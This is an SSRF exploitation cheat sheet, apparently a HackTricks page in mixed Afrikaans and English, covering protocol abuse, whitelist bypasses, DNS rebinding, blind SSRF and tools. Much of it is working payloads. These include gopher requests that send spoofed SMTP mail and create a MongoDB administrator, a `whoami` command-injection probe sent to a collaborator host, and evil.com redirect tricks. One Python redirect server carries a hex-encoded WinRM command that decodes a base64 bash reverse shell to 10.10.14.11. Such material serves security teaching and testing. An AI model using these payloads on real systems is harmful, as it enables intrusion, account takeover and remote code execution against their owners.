# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

'n **Server-side Request Forgery (SSRF)** kwesbaarheid ontstaan wanneer 'n aanvaller 'n **server-side application** manipuleer om **HTTP requests** na 'n domein van hul keuse te stuur. Hierdie kwesbaarheid stel die bediener bloot aan ewekansige eksterne versoeke gerig deur die aanvaller.

## Capture SSRF

Die eerste ding wat jy moet doen is om 'n SSRF-interaksie wat jy genereer het, vas te vang. Om 'n HTTP- of DNS-interaksie vas te vang, kan jy gereedskap soos die volgende gebruik:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Whitelisted Domains Bypass

Gewoonlik sal jy vind dat die SSRF slegs werk in **sekere whitelisted domains** of URL. Op die volgende bladsy het jy 'n **samestelling van tegnieke om daardie whitelist te probeer omseil**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via open redirect

As die bediener korrek beskerm is, kan jy **al die beperkings omseil deur 'n Open Redirect binne die webblad uit te buit**. Aangesien die webblad **SSRF to the same domain** sal toelaat en waarskynlik **follow redirects**, kan jy die **Open Redirect uitbuit om die bediener enige interne hulpbron te laat bereik**.\
Read more here: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protocols

- **file://**
- Die URL-skema `file://` word verwys, wat direk na `/etc/passwd` wys: `file:///etc/passwd`
- **dict://**
- Die DICT URL-skema word beskryf as wat gebruik word om definisies of woordlyste via die DICT-protokol te verkry. 'n Voorbeeld illustreer 'n saamgestelde URL wat 'n spesifieke woord, databasis en inskrywingsnommer teiken, sowel as 'n voorbeeld van 'n PHP script wat moontlik misbruik kan word om met 'n DICT-bediener te verbind met aanvalergeverserde geloofsbriewe: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Beskryf as 'n protokol vir veilige lêeroordrag oor secure shell; 'n voorbeeld wys hoe 'n PHP script misbruik kan word om met 'n kwaadwillige SFTP-bediener te verbind: `url=sftp://generic.com:11111/`
- **TFTP://**
- Trivial File Transfer Protocol wat oor UDP werk, word genoem met 'n voorbeeld van 'n PHP script wat 'n versoek na 'n TFTP-bediener stuur. 'n TFTP-versoek word gemaak na 'generic.com' op poort '12346' vir die lêer 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Hierdie afdeling dek die Lightweight Directory Access Protocol en beklemtoon die gebruik daarvan vir die bestuur en toegang tot verspreide gidsinligtingdienste oor IP-netwerke. Interaksie met 'n LDAP-bediener op localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- 'n Metode word beskryf om SSRF-kwesbaarhede te misbruik om met SMTP-dienste op localhost te kommunikeer, insluitend stappe om interne domeinname bloot te lê en verdere ondersoekstappe gebaseer op daardie inligting.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Indien die SSRF deur **curl** uitgevoer word, het curl 'n funksie genaamd [**URL globbing**](https://everything.curl.dev/cmdline/globbing) wat nuttig kan wees om WAFs te omseil. Byvoorbeeld in hierdie [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) kan jy hierdie voorbeeld vir 'n **path traversal via `file` protocol** vind:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Die Gopher protocol se vermoë om IP, port, en bytes te spesifiseer vir kommunikasie met 'n server word bespreek, tesame met gereedskap soos Gopherus en remote-method-guesser om payloads te skep. Twee verskillende gebruike word geïllustreer:

### Gopher://

Deur hierdie protocol te gebruik kan jy die **IP, port and bytes** spesifiseer wat jy wil hê die server moet **send**. Dan kan jy basies 'n SSRF uitbuit om **communicate with any TCP server** (maar jy moet eers weet hoe om met die service te praat).\
Gelukkig kan jy [Gopherus](https://github.com/tarunkant/Gopherus) gebruik om payloads vir verskeie services te skep. Boonop kan [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) gebruik word om _gopher_ payloads vir _Java RMI_ services te skep.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Terugverbind na 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Skep gebruiker met username=admin, password=admin123 en permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & Ander

Analytics-sagteware op bedieners registreer dikwels die Referrer header om inkomende skakels te spoor, 'n praktyk wat per ongeluk toepassings aan Server-Side Request Forgery (SSRF) kwesbaarhede blootstel. Dit is omdat sulke sagteware moontlik eksterne URLs wat in die Referrer header genoem word, besoek om die inhoud van die verwysende webwerf te ontleed. Om hierdie kwesbaarhede op te spoor, word die Burp Suite-plugin "**Collaborator Everywhere**" aanbeveel, wat die manier benut waarop analytics-instrumente die Referer header verwerk om potensiële SSRF-aanvaloppervlaktes te identifiseer.

## SSRF via SNI data from certificate

'n Miskonfigurasie wat die verbinding na enige backend deur 'n eenvoudige opstelling moontlik kon maak, word geïllustreer met 'n voorbeeld Nginx-konfigurasie:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
In hierdie konfigurasie word die waarde uit die Server Name Indication (SNI)-veld direk gebruik as die backend-adres. Hierdie opstelling stel ’n kwesbaarheid bloot vir Server-Side Request Forgery (SSRF), wat uitgebuit kan word deur bloot die gewenste IP-adres of domeinnaam in die SNI-veld te spesifiseer. ’n Voorbeeld van uitbuiting om ’n verbinding na ’n ewekansige backend, soos `internal.host.com`, af te dwing met die `openssl`-opdrag, word hieronder gegee:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF via TLS AIA CA Issuers (Java mTLS)

Some TLS stacks will auto-download missing intermediate CAs using the **Authority Information Access (AIA) → CA Issuers** URI inside the peer certificate. In **Java**, enabling `-Dcom.sun.security.enableAIAcaIssuers=true` while running an mTLS service makes the server dereference attacker-controlled URIs from the client certificate **during the handshake**, before any HTTP logic runs.

- **Requirements**: mTLS enabled, Java AIA fetching enabled, attacker can present a client cert with a crafted AIA CA Issuers URI.
- **Triggering SSRF** (Java 21 example):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
Die Java certpath debug-uitset wys `CertStore URI:http://localhost:8080`, en `nc` vang die HTTP-versoek met die beheerbare `User-Agent` van `-Dhttp.agent`, wat SSRF tydens sertifikaatvalidering bewys.
- **DoS via file://**: setting AIA CA Issuers to `file:///dev/urandom` on Unix-like hosts makes Java treat it as a CertStore and read unbounded random bytes, keeping a CPU core busy and blocking subsequent connections even after the client disconnects.

## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

Dit kan waardevol wees om 'n payload te probeer soos: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDFs Rendering

If the web page is automatically creating a PDF with some information you have provided, you can **insert some JS that will be executed by the PDF creator** itself (the server) while creating the PDF and you will be able to abuse a SSRF. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## From SSRF to DoS

Skep verskeie sessies en probeer swaar lêers aflaai deur die SSRF vanaf daardie sessies uit te buit.

## SSRF PHP Functions

Kyk na die volgende bladsy vir kwesbare PHP en selfs Wordpress funksies:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

For some exploitations you might need to **send a redirect response** (potentially to use a different protocol like gopher). Here you have different python codes to respond with a redirect:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Verkeerd gekonfigureerde proxies na SSRF

Truuks [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask proxy kwesbare kode</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask laat toe om **`@`** as aanvanklike karakter te gebruik, wat toelaat om die **initial host name the username** te maak en 'n nuwe een te injekteer. Attack request:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Kwetsbare code:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Daar is ontdek dat dit moontlik is om die **pad** van 'n request te begin met die karakter **`;`**, wat dit toelaat om daarna **`@`** te gebruik en 'n nuwe host in te spuit om toegang te kry. Attack request:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP ingeboude webbediener <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Kwetsbare PHP-kode</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP laat die gebruik van die **char `*` voor 'n skuinsstreep in die pad** van die URL toe, maar dit het ander beperkings, soos dat dit slegs vir die wortel-padnaam `/` gebruik kan word en dat punte `.` nie voor die eerste skuinsstreep toegelaat word nie, dus is dit nodig om byvoorbeeld 'n dotless-hex-geënkodeerde IP-adres te gebruik:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

As jy **problems** het om **exfiltrate content from a local IP** weens **CORS/SOP**, **DNS Rebidding** kan gebruik word om daardie beperking te omseil:

{{#ref}}
../cors-bypass.md
{{#endref}}

### Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) is 'n hulpmiddel om [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) attacks uit te voer. Dit sluit die nodige komponente in om die IP-adres van die attack server se DNS-naam na die target machine se IP-adres te herbind en om attack payloads te bedien om vulnerable software op die target machine te exploit.

Kyk ook na die **publieke bediener** by [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Vereistes:

- **SSRF**
- **Outbound TLS sessions**
- **Dinge op lokale poorte**

Aanval:

1. Vra die gebruiker/bot om 'n **domain** wat deur die **attacker** beheer word te **access**
2. Die **TTL** van die **DNS** is **0** sek (sodat die victim binnekort weer die IP van die domain sal nagaan)
3. 'n **TLS connection** word geskep tussen die victim en die domain van die attacker. Die attacker introduceer die **payload inside** die **Session ID or Session Ticket**.
4. Die **domain** sal 'n **infinite loop** van redirects teen **homself** begin. Die doel hiervan is om die gebruiker/bot die domain te laat access totdat dit **again** 'n **DNS request** van die domain uitvoer.
5. In die DNS request word 'n **private IP** adres **now** gegee (127.0.0.1 byvoorbeeld)
6. Die gebruiker/bot sal probeer om die **reestablish the TLS connection** en om dit te doen sal dit die **Session** ID/Ticket ID **send** (waar die **payload** van die attacker bevat was). So geluk — jy het dit reggekry om die **user/bot attack himself**.

Let daarop dat tydens hierdie aanval, as jy localhost:11211 (_memcache_) wil attack, moet jy die victim die aanvanklike verbinding laat vestig met www.attacker.com:11211 (die **port must always be the same**).\
Om **hierdie aanval uit te voer kan jy die tool gebruik**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Vir **more information** kyk na die praatjie waar hierdie aanval verduidelik word: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

Die verskil tussen 'n blind SSRF en 'n nie-blind een is dat jy in die blind nie die response van die SSRF request kan sien nie. Dit maak dit moeiliker om te exploit omdat jy slegs well-known vulnerabilities sal kan exploit.

### Time based SSRF

**Checking the time** van die responses van die server kan dit **possible to know if a resource exists or not** (miskien neem dit meer tyd om 'n bestaande resource te access as om een wat nie bestaan nie)

### From blid to full abusing status codes

Volgens hierdie [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), kan sommige blind SSRF voorkom omdat selfs al die geteikende URL met 'n 200 status code antwoord (soos AWS metadata), hierdie data nie behoorlik geformateer is nie en daarom die app kan weier om dit te wys.

Daar is egter gevind dat deur sekere redirect-responses van 305 tot 309 in die SSRF te stuur, dit moontlik is om die toepassing te laat **volg hierdie redirects terwyl dit in 'n foutmodus ingaan** wat nie meer die formaat van die data sal nagaan nie en dit moontlik net sal uitdruk.

Die python bediener wat gebruik word om dit te exploit is die volgende:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Stappe:**
- Eerstens laat 302 die app begin volg.
- Dan ontvang dit 305 → 306 → 307 → 308 → 309 → 310.
- Na die 5de vreemde kode stuur die PoC uiteindelik 302 → 169.254.169.254 → 200 OK terug.

**Wat gebeur binne die teiken:**
- libcurl self volg 305–310; dit normaliseer net onbekende kodes as “follow.”
- Na N vreemde redirects (≥ 5 hier) besluit die toepassing se eie wrapper dat “iets is fout” en skakel na ’n foutmodus bedoel vir debugging.
- In daardie modus gooi dit die hele redirect-ketting plus die finale body terug aan die eksterne caller.
- Resultaat: attacker sien elke header + die metadata JSON, missie volbring.

Neem kennis dat dit interessant is om statuskodes te leak wat jy voorheen nie kon leak nie (soos ’n 200). As jy egter op een of ander manier ook die statuskode van die response kon kies (stel jou voor jy kan besluit dat die AWS metadata met ’n 500 statuskode reageer), **daar kan statuskodes wees wat direk die inhoud van die response leak.**

### HTML-to-PDF renderers as blind SSRF gadgets

Biblioteke soos **TCPDF** (en wrappers soos **spipu/html2pdf**) sal outomaties enige URLs wat in attacker-controlled HTML voorkom haal terwyl ’n PDF geskep word. Elke `<img>` of `<link rel="stylesheet">` attribuut word aan die bedienerkant opgelos via cURL, `getimagesize()`, of `file_get_contents()`, sodat jy die PDF-worker kan gebruik om interne hosts te verken, selfs al word geen HTTP response aan jou teruggekaats nie.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 onderneem verskeie herwinningspogings vir elke `<img>` resource, so a single payload kan meerdere requests genereer (helpful for timing-based port scans).
- html2pdf kopieer TCPDF’s behaviour vir `<img>` en voeg CSS fetching binne `Css::extractStyle()` by, wat eenvoudig `file_get_contents($href)` aanroep na 'n oppervlakkige scheme check. Abuse dit om loopback services, RFC1918 ranges, of cloud metadata endpoints te hit.
- Kombineer hierdie SSRF primitive met die [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) om beide interne HTTP-antwoorde en plaaslike lêers wat in die PDF gerender is, te leak.

Stelselhardeners moet eksterne URL's verwyder voordat rendering plaasvind of die renderer in 'n netwerk-sandbox isoleer; tot dan, behandel PDF generators as blind SSRF proxies.

## Cloud SSRF Exploitation

As jy 'n SSRF-kwetsbaarheid vind in 'n masjien wat binne 'n cloud-omgewing loop, kan jy moontlik interessante inligting oor die cloud-omgewing en selfs credentials bekom:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF Vulnerable Platforms

Verskeie bekende platforme bevat of het SSRF-kwetsbaarhede gehad; kyk hulle in:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Tools

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Tool om SSRF-kwetsbaarhede te detect en te exploit

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Hierdie tool genereer Gopher payloads vir:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ is 'n _Java RMI_ kwesbaarheidsskandeerder wat aanvalsbewerkings vir die mees algemene _Java RMI_ kwesbaarhede ondersteun. Die meeste beskikbare operasies ondersteun die `--ssrf` opsie om 'n _SSRF_ payload vir die versoekte operasie te genereer. Saam met die `--gopher` opsie kan klaar-om-te-gebruik _gopher_ payloads direk gegenereer word.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy is 'n multi-threaded HTTP proxy server ontwerp om kliënt-HTTP-verkeer deur HTTP-bedieners wat vatbaar is vir Server-Side Request Forgery (SSRF) te tunnel.

### Om te oefen


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## References

